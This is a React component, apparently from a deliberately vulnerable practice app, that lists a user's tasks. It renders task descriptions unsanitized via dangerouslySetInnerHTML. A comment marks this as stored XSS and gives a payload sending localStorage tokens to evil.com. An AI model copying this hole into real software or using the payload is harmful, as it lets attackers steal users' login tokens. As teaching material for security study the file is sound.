import React, { useEffect, useState } from 'react';
import axios from 'axios';

export default function TaskList({ userId }) {
  const [tasks, setTasks] = useState([]);

  useEffect(() => {
    axios
      .get(`http://localhost:5000/api/tasks/user/${userId}`, {
        headers: { Authorization: `Bearer ${localStorage.getItem('token')}` },
      })
      .then((res) => setTasks(res.data));
  }, [userId]);

  return (
    <ul>
      {tasks.map((task) => (
        <li key={task._id}>
          <strong>{task.title}</strong>
          {/*
            VULN (CWE-79): task.description comes straight from the database,
            which came straight from user input at creation time, and is
            rendered here with dangerouslySetInnerHTML with zero sanitization.
            A task description of <img src=x onerror="fetch('//evil.com/steal?c='+localStorage.token)">
            will execute in the browser of anyone who views this task,
            stealing the JWT saved by Login.js.
          */}
          <div dangerouslySetInnerHTML={{ __html: task.description }} />
        </li>
      ))}
    </ul>
  );
}
